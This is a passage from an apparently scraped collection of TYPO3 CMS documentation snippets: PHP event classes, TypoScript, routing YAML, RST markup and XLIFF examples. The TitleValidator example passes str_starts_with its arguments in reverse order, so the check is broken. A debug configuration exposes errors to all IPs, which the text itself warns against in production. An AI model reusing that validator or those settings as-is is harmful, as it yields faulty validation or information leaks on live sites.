void\n    {\n        $brokenLinks = $linkAnalyzerResult->getBrokenLinks();\n\n        foreach ($brokenLinks as &$brokenLink) {\n            // Add custom data for each broken link\n            $brokenLink['custom_data'] = [\n                'date' => new \\DateTime(),\n            ];\n        }\n\n        $linkAnalyzerResult->setBrokenLinks($brokenLinks);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Incorrect Identifier Naming Example in PHP\nDESCRIPTION: This snippet shows examples of incorrectly named variables in PHP, highlighting the misuse of underscores, uppercase letters, and overly long variable names.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$BAD_name\n$unreasonablyLongNamesAreBadToo\n$noAbbrAlwd\n```\n\n----------------------------------------\n\nTITLE: Defining SortVersionedDataEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the SortVersionedDataEvent class, which is a PSR-14 event used in TYPO3's Workspaces module. It allows modification of versioned data after sorting.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Workspaces/SortVersionedDataEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class SortVersionedDataEvent\n{\n    /**\n     * @var array\n     */\n    private $versionedData;\n\n    public function __construct(array $versionedData)\n    {\n        $this->versionedData = $versionedData;\n    }\n\n    public function getVersionedData(): array\n    {\n        return $this->versionedData;\n    }\n\n    public function setVersionedData(array $versionedData): void\n    {\n        $this->versionedData = $versionedData;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Unsetting TYPO3 Properties with ObjectUnset\nDESCRIPTION: This code snippet demonstrates how to unset properties in TYPO3 TypoScript using the ObjectUnset operator. It shows the removal of a property completely, including its value and any sub-identifiers. The example also illustrates how comments can be added after the unset operator.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/OperatorUnset.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n   myIdentifier.mySubIdentifier = TEXT\n   myIdentifier.mySubIdentifier = myValue\n   myIdentifier.mySubIdentifier.stdWrap = <p>|</p>\n\n   # \"myIdentifier.mySubIdentifier\" is completely removed, including value\n   # assignment and sub identifier \"stdWrap\"\n   myIdentifier.mySubIdentifier >\n\n   # Same as above: Everything after \">\" operator is considered a comment\n   myIdentifier.mySubIdentifier > // Some comment\n```\n\n----------------------------------------\n\nTITLE: Converting Line Breaks in reStructuredText\nDESCRIPTION: This snippet demonstrates the conversion of line breaks to <br /> tags in TYPO3 content rendering.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/HistoricalRteTransformations/RteTransformationsInContentElements.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\nAll line breaks are converted to :code:`<br />` codes.\n```\n\n----------------------------------------\n\nTITLE: Fluid ViewHelper for Single File Reference Deletion\nDESCRIPTION: Fluid code example showing how to implement a file deletion checkbox for a single FileReference property in a TYPO3 Extbase form.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FileUpload.rst#2025-04-16_snippet_7\n\nLANGUAGE: PHP\nCODE:\n```\n<f:form.uploadDeleteCheckbox property=\"file\" fileReference=\"{object.file}\" />\n```\n\n----------------------------------------\n\nTITLE: Accessing SendRecoveryEmailEvent in PHP\nDESCRIPTION: This code snippet shows the structure and properties of the SendRecoveryEmailEvent class in TYPO3 CMS. It includes methods for retrieving and modifying the email object and user data associated with the password recovery process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/FrontendLogin/SendRecoveryEmailEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nfinal class SendRecoveryEmailEvent\n{\n    public function __construct(\n        private readonly FluidEmail $email,\n        private readonly array $userData\n    ) {}\n\n    public function getEmail(): FluidEmail\n    {\n        return $this->email;\n    }\n\n    public function getUserData(): array\n    {\n        return $this->userData;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: RST Image Directive for TCA Fields Screenshot\nDESCRIPTION: ReStructuredText directive for displaying a screenshot of extended TCA fields in the TYPO3 backend, including styling class and caption.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/ExtendingTca/ExtendingTcaFeUsers.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/ExtendingTca/ExtendingTcaFeUsers.png\n   :class: with-shadow\n\n   The new fields added at the bottom of the \"Extended\" tab\n```\n\n----------------------------------------\n\nTITLE: Getting Database Row in AfterFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method returns the entire database row of the current record.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getRow()\n    :returns: `array`\n```\n\n----------------------------------------\n\nTITLE: Importing TypoScript Files in TYPO3 Site Package\nDESCRIPTION: This snippet shows how to import TypoScript files in a TYPO3 site package. It uses the @import directive to include all .typoscript files from the TypoScript directory and its Navigation subdirectory. This approach allows for better organization and modularity of TypoScript configurations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/_Sets/_site-package/_setup.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n@import './TypoScript/*.typoscript'\n@import './TypoScript/Navigation/*.typoscript'\n```\n\n----------------------------------------\n\nTITLE: RST YouTube Directive\nDESCRIPTION: RST directive for embedding a YouTube video related to the documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/TranslationServer/Crowdin.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n..  youtube:: 5TnUh0AzqHE\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Error Handling for Debugging Environment in PHP\nDESCRIPTION: PHP configuration for a debug/development environment that enables verbose error reporting and exception handling. This setup displays all errors and exceptions in the frontend. Not recommended for production use as it exposes system information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/Examples/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$changeSettings['SYS'] = [\n  'displayErrors' => 1,\n  'devIPmask' => '*',\n  'errorHandler' => 'TYPO3\\\\CMS\\\\Core\\\\Error\\\\ErrorHandler',\n  'errorHandlerErrors' => E_ALL ^ E_NOTICE,\n  'exceptionalErrors' => E_ALL ^ E_NOTICE ^ E_WARNING ^ E_USER_ERROR ^ E_USER_NOTICE ^ E_USER_WARNING,\n  'debugExceptionHandler' => 'TYPO3\\\\CMS\\\\Core\\\\Error\\\\DebugExceptionHandler',\n  'productionExceptionHandler' => 'TYPO3\\\\CMS\\\\Core\\\\Error\\\\DebugExceptionHandler',\n];\n\n$GLOBALS['TYPO3_CONF_VARS'] = array_replace_recursive($GLOBALS['TYPO3_CONF_VARS'], $changeSettings);\n```\n\n----------------------------------------\n\nTITLE: Defining SiteConfigurationBeforeWriteEvent Class in PHP\nDESCRIPTION: This code snippet defines the SiteConfigurationBeforeWriteEvent class in TYPO3 CMS. It allows modification of the site configuration array before writing to disk. The class includes methods to get and set the configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Configuration/SiteConfigurationBeforeWriteEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class SiteConfigurationBeforeWriteEvent\n{\n    public function __construct(\n        private string $siteIdentifier,\n        private array $configuration\n    ) {\n    }\n\n    public function getSiteIdentifier(): string\n    {\n        return $this->siteIdentifier;\n    }\n\n    public function getConfiguration(): array\n    {\n        return $this->configuration;\n    }\n\n    public function setConfiguration(array $configuration): void\n    {\n        $this->configuration = $configuration;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterRecordPublishedEvent Class Methods in TYPO3 Workspaces\nDESCRIPTION: Defines three getter methods in the AfterRecordPublishedEvent class that provide access to published record details: getTable() returns the table name, getRecordId() returns the record's UID, and getWorkspaceId() returns the workspace identifier where publication occurred.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Workspaces/AfterRecordPublishedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nphp:namespace::  TYPO3\\CMS\\Workspaces\\Event\n\nphp:class:: AfterRecordPublishedEvent\n\n    php:method:: getTable()\n        :returns: `string`\n\n    php:method:: getRecordId()\n        :returns: `int`\n\n    php:method:: getWorkspaceId()\n        :returns: `int`\n```\n\n----------------------------------------\n\nTITLE: Configuring System Maintainers in TYPO3 Settings\nDESCRIPTION: System Maintainers in TYPO3 are persisted within the settings.php file as a global configuration variable. This snippet shows where the system maintainer user IDs are stored in the TYPO3 configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendPrivileges/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['systemMaintainers']\n```\n\n----------------------------------------\n\nTITLE: Defining ExpressionBuilder Class in TYPO3 CMS Core Database Query\nDESCRIPTION: This snippet defines the ExpressionBuilder class within the TYPO3\\CMS\\Core\\Database\\Query\\Expression namespace. The class is responsible for dynamically creating SQL query parts, ensuring proper quoting of table and column names, and serving as a facade to the Doctrine ExpressionBuilder.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/_ExpressionBuilder.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Database\\Query\\Expression;\n\nclass ExpressionBuilder\n{\n    // Class implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Including TypoScript Constants in TYPO3\nDESCRIPTION: The code snippet provides an inclusion directive for TypoScript constants within TYPO3. It specifies the scope and file types that apply to this inclusion, mainly for backward compatibility with installations that do not use site sets. Users should ensure to update settings in site configurations as needed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtTyposcriptConstantsTyposcript.rst#2025-04-16_snippet_0\n\nLANGUAGE: TypoScript\nCODE:\n```\n..  typo3:file:: ext_typoscript_constants.typoscript\n    :scope: extension\n    :regex: /^.*ext\\_typoscript\\_constants\\.(typoscript|txt|ts)$/\n    :shortDescription: Preset TypoScript constants for sites without site sets\n\n    Preset TypoScript constants. Will be included in the constants section of all\n    TypoScript **records**. Takes no effect in sites using :ref:`Site sets <t3coreapi:site-sets>`.\n```\n\n----------------------------------------\n\nTITLE: Defining CheckExternalLinksToLocalPagesEventListener Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines a final readonly class named CheckExternalLinksToLocalPagesEventListener. It uses dependency injection to instantiate BrokenLinkRepository and SoftReferenceParserFactory objects. The class is designed to handle events related to checking external links that point to local pages within the TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Linkvalidator/BeforeRecordIsAnalyzedEvent/ExampleInject.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\DataHandling\\SoftReference\\SoftReferenceParserFactory;\nuse TYPO3\\CMS\\Linkvalidator\\Repository\\BrokenLinkRepository;\n\nfinal readonly class CheckExternalLinksToLocalPagesEventListener\n{\n\n    public function __construct(\n        private BrokenLinkRepository $brokenLinkRepository,\n        private SoftReferenceParserFactory $softReferenceParserFactory,\n    ) {}\n}\n```\n\n----------------------------------------\n\nTITLE: RST Heading and Include Directives for TYPO3 Mail Documentation\nDESCRIPTION: ReStructuredText markup for including common definitions and setting up documentation structure for TYPO3 mail events documentation\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Mail/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Core Mail\n..  _eventlist-core-mail:\n\n====\nMail\n====\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:core, namespace Mail.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Registering TYPO3 Ajax Routes Configuration\nDESCRIPTION: Configures the Ajax route definition in TYPO3 backend. Maps the controller action to a specific URL path.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/Ajax.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nreturn [\n    'myextension_example_dosomething' => [\n        'path' => '/my-extension/example/do-something',\n        'target' => \\MyVendor\\MyExtension\\Controller\\ExampleController::class . '::doSomethingAction',\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Implementing TitleValidator in TYPO3 CMS BlogExample Domain (PHP)\nDESCRIPTION: This code snippet defines the TitleValidator class, which extends AbstractValidator. It validates that a blog post title does not start with an underscore. If it does, an error is added with a specific error code.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Validator/PropertyValidator.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class TitleValidator extends AbstractValidator\n{\n    protected function isValid(mixed $value): void\n    {\n        // $value is the title string\n        if (str_starts_with('_', $value)) {\n            $errorString = 'The title may not start with an underscore. ';\n            $this->addError($errorString, 1297418976);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Blog Model Class in TYPO3 CMS (PHP)\nDESCRIPTION: This code snippet defines a Blog class for managing blog posts in TYPO3 CMS. It uses ObjectStorage to handle a collection of Post objects and provides methods for adding, removing, retrieving, and setting posts. The class extends AbstractEntity and is part of the T3docs\\BlogExample\\Domain\\Model namespace.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/Relationship1onN2.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage;\n\nclass Blog extends AbstractEntity\n{\n    /**\n     * @var ?ObjectStorage<Post>\n     */\n    public ?ObjectStorage $posts = null;\n\n    /**\n     * Adds a post to this blog\n     */\n    public function addPost(Post $post): void\n    {\n        $this->posts?->attach($post);\n    }\n\n    /**\n     * Remove a post from this blog\n     */\n    public function removePost(Post $postToRemove): void\n    {\n        $this->posts?->detach($postToRemove);\n    }\n\n    /**\n     * Returns all posts in this blog\n     *\n     * @return ObjectStorage<Post>\n     */\n    public function getPosts(): ObjectStorage\n    {\n        return $this->posts;\n    }\n\n    /**\n     * @param ObjectStorage<Post> $posts\n     */\n    public function setPosts(ObjectStorage $posts): void\n    {\n        $this->posts = $posts;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Application Context in Apache .htaccess\nDESCRIPTION: Shows how to set the TYPO3_CONTEXT environment variable to Development mode in an Apache .htaccess file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/ApplicationContext/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nSetEnv TYPO3_CONTEXT Development\n```\n\n----------------------------------------\n\nTITLE: Configuring Blog Tags Routing in TYPO3 CMS\nDESCRIPTION: This YAML configuration sets up routing for the Blog extension's tag functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Examples.rst#2025-04-16_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  BlogTag:\n    type: Extbase\n    extension: Blog\n    plugin: Tag\n    routes:\n      - routePath: '/'\n      - routePath: '/{tag_slug}'\n    defaultController: 'Post::listPostsByTag'\n    aspects:\n      tag_slug:\n        type: PersistedPatternMapper\n        tableName: tx_blog_domain_model_tag\n        routeFieldPattern: '^(?P<slug>.+)$'\n        routeFieldResult: '{slug}'\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents for TYPO3 Security Guidelines in reStructuredText\nDESCRIPTION: This snippet defines the table of contents for the TYPO3 security guidelines documentation using reStructuredText syntax. It includes various sections covering different aspects of security.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. toctree::\n   :titlesonly:\n\n   Introduction/Index\n   SecurityTeam/Index\n   GeneralInformation/Index\n   TypesOfThreats/Index\n   GeneralGuidelines/Index\n   GuidelinesAdministrators/Index\n   GuidelinesExtensionDevelopment/Index\n   GuidelinesIntegrators/Index\n   GuidelinesEditors/Index\n   Backups/Index\n   HackedSite/Index\n```\n\n----------------------------------------\n\nTITLE: Defining Reference Label for Request Attributes Section\nDESCRIPTION: Creates a reStructuredText reference label named 'request-attributes' that can be linked to from other parts of the documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. _request-attributes:\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileUpdatedInIndexEvent Class Methods in TYPO3\nDESCRIPTION: Defines three accessor methods within the AfterFileUpdatedInIndexEvent class that provide access to the updated file, its relevant properties, and updated fields after a file index operation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileUpdatedInIndexEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFileUpdatedInIndexEvent {\n    public function getFile(): \\TYPO3\\CMS\\Core\\Resource\\File;\n    public function getRelevantProperties(): array;\n    public function getUpdatedFields(): array;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Transient Memory Cache Backend in TYPO3\nDESCRIPTION: Extended cache configuration example showing how to set up a transient memory backend while still allowing administrator overrides.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Developer/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations']['myext_mycache'] ??= [];\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations']['myext_mycache']['backend'] ??= \\TYPO3\\CMS\\Core\\Cache\\Backend\\TransientMemoryBackend::class;\n```\n\n----------------------------------------\n\nTITLE: Defining CustomFileControlsEvent Class in PHP for TYPO3\nDESCRIPTION: This code snippet defines the CustomFileControlsEvent class used in TYPO3's backend. It allows for adding custom controls to file fields in the Form Engine, providing methods to get and set controls, retrieve the table name, and access field configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/CustomFileControlsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class CustomFileControlsEvent\n{\n    public function __construct(\n        private array $controls,\n        private readonly string $table,\n        private readonly array $fieldConfig\n    ) {\n    }\n\n    public function getControls(): array\n    {\n        return $this->controls;\n    }\n\n    public function setControls(array $controls): void\n    {\n        $this->controls = $controls;\n    }\n\n    public function getTable(): string\n    {\n        return $this->table;\n    }\n\n    public function getFieldConfig(): array\n    {\n        return $this->fieldConfig;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: RST Attention Notice\nDESCRIPTION: RST markup for an attention notice about RequireJS discontinuation and migration to ES6 modules in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/RequireJS/Dependency/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n..  attention::\n    The RequireJS project has been discontinued_ and was therefore\n    replaced by native ECMAScript v6/v11 modules in TYPO3 v12.0. The\n    infrastructure for configuration and loading of RequireJS\n    modules was deprecated with v12.0 and has been removed in TYPO3 v13. See\n    :ref:`RequireJS to ES6 migration <t3coreapi-12:requirejs-migration>`.\n```\n\n----------------------------------------\n\nTITLE: Manual Password Validation in TYPO3 Command\nDESCRIPTION: Example of a TYPO3 command that validates a password from user input against the default policy using the PasswordPolicyValidator.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/PasswordPolicies/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Command;\n\nuse Symfony\\Component\\Console\\Command\\Command;\nuse Symfony\\Component\\Console\\Input\\InputInterface;\nuse Symfony\\Component\\Console\\Output\\OutputInterface;\nuse Symfony\\Component\\Console\\Question\\Question;\nuse Symfony\\Component\\Console\\Style\\SymfonyStyle;\nuse TYPO3\\CMS\\Core\\PasswordPolicy\\PasswordPolicyAction;\nuse TYPO3\\CMS\\Core\\PasswordPolicy\\PasswordPolicyValidator;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\nfinal class PrivateKeyGeneratorCommand extends Command\n{\n    protected function execute(InputInterface $input, OutputInterface $output): int\n    {\n        $io = new SymfonyStyle($input, $output);\n\n        $passwordHelper = $this->getHelper('question');\n\n        $passwordQuestion = new Question('Enter a password to encrypt the private key');\n        $passwordQuestion->setHidden(true);\n        $passwordQuestion->setValidator(function ($password) {\n            // Manual validation against policy\n            if (!$password) {\n                throw new \\RuntimeException('Password must not be empty');\n            }\n\n            // Use the default backend policy to validate the password\n            $passwordPolicyValidator = GeneralUtility::makeInstance(\n                PasswordPolicyValidator::class,\n                PasswordPolicyAction::NEW_USER_PASSWORD\n            );\n\n            if (!$passwordPolicyValidator->validate($password, null, 'BE')) {\n                $errors = $passwordPolicyValidator->getErrors();\n                throw new \\RuntimeException(implode(', ', $errors));\n            }\n\n            return $password;\n        });\n\n        $password = $passwordHelper->ask($input, $output, $passwordQuestion);\n\n        // Generate private key with password and return success\n        return Command::SUCCESS;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Section Header in reStructuredText\nDESCRIPTION: This snippet defines a section header for 'Properties and Transformations' in reStructuredText. It includes a reference label for cross-linking within the documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/HistoricalRteTransformations/PropertiesAndTransformations.rst#2025-04-16_snippet_1\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. _appendix-a-properties:\n\n==============================\nProperties and Transformations\n==============================\n```\n\n----------------------------------------\n\nTITLE: Defining Simple FlexForm Structure in XML for TYPO3 CMS\nDESCRIPTION: This XML snippet defines a basic FlexForm data structure for TYPO3 CMS. It includes a single sheet named 'sDEF' with one input field. This structure is typically used in TYPO3 extensions to create flexible content elements or plugin configurations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/FlexForms/Simple.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: XML\nCODE:\n```\n<T3DataStructure>\n    <sheets>\n        <sDEF>\n            <ROOT>\n                <sheetTitle>Sheet Title</sheetTitle>\n                <type>array</type>\n                <el>\n                    <input_1>\n                        <label>input_1</label>\n                        <config>\n                            <type>input</type>\n                        </config>\n                    </input_1>\n                </el>\n            </ROOT>\n        </sDEF>\n    </sheets>\n</T3DataStructure>\n```\n\n----------------------------------------\n\nTITLE: Using Symfony Dotenv to Parse .env File in TYPO3\nDESCRIPTION: This PHP code snippet shows how to use the Symfony Dotenv library to parse a .env file in a TYPO3 project. It loads the environment variables from the .env file in the project root.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/EnvironmentConfiguration.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\nuse Symfony\\Component\\Dotenv\\Dotenv;\n\n$dotenv = new Dotenv();\n$dotenv->load(dirname(__DIR__, 2) . '/.env');\n```\n\n----------------------------------------\n\nTITLE: Creating RST Documentation Structure for TYPO3 Configuration Events\nDESCRIPTION: RST markup defining the documentation structure for TYPO3 configuration events, including includes, index entries, and table of contents.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Configuration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Core Configuration\n..  _eventlist-core-configuration:\n\n\n=============\nConfiguration\n=============\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:core, namespace Configuration.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Configuring Blog Feeds Routing in TYPO3 CMS\nDESCRIPTION: This YAML configuration sets up routing for the Blog extension's feed functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Examples.rst#2025-04-16_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  BlogFeeds:\n    type: Plugin\n    routePath: '/feeds/{format}'\n    namespace: 'tx_blog_feed'\n    aspects:\n      format:\n        type: StaticValueMapper\n        map:\n          'atom.xml': 'atom'\n          'rss.xml': 'rss'\n```\n\n----------------------------------------\n\nTITLE: Applying Core Patch by Change ID\nDESCRIPTION: Command to automatically apply a TYPO3 core patch by its change ID from the TYPO3 review system using the gilbertsoft/typo3-core-patches package.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/ApplyingCorePatches/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\ncomposer typo3:patch:apply <change-id>\n```\n\n----------------------------------------\n\nTITLE: Defining Blog Model Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the Blog class which extends AbstractEntity. It includes a public string property 'title' initialized as an empty string. This class represents the basic structure of a blog entity in the TYPO3 CMS Blog Example extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Validator/PropertyValidatorUsage.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nclass Blog extends AbstractEntity\n{\n    public string $title = '';\n}\n```\n\n----------------------------------------\n\nTITLE: Translated XLIFF File Structure in TYPO3 CMS (XML)\nDESCRIPTION: Example of a translated XLIFF file for the German language in TYPO3. This file contains both source (English) texts and their German translations as target elements. The target-language attribute indicates the translation language.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/XliffFormat.rst#2025-04-16_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?>\n<xliff version=\"1.0\">\n   <file source-language=\"en\" target-language=\"de\" datatype=\"plaintext\" original=\"EXT:my_ext/Resources/Private/Language/Modules/module_name.xlf\">\n      <body>\n         <trans-unit id=\"mlang_labels_tablabel\">\n            <source>A Description Text</source>\n            <target>Ein Beschreibungstext</target>\n         </trans-unit>\n         <trans-unit id=\"mlang_labels_tabdescr\">\n            <source>A long description</source>\n            <target>Eine lange Beschreibung</target>\n         </trans-unit>\n         <trans-unit id=\"mlang_tabs_tab\">\n            <source>The Backend Module Name</source>\n            <target>Der Backend-Modulname</target>\n         </trans-unit>\n      </body>\n   </file>\n</xliff>\n```\n\n----------------------------------------\n\nTITLE: Implementing ImmediateAction with RequireJS in TYPO3 Notification API\nDESCRIPTION: Example showing how to implement an ImmediateAction in the TYPO3 Notification API using RequireJS for compatibility with TYPO3 v11. The action redirects to an update page when clicked.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlashMessages/NotificationApi.rst#2025-04-16_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\ndefine([\n  'TYPO3/CMS/Backend/Notification',\n  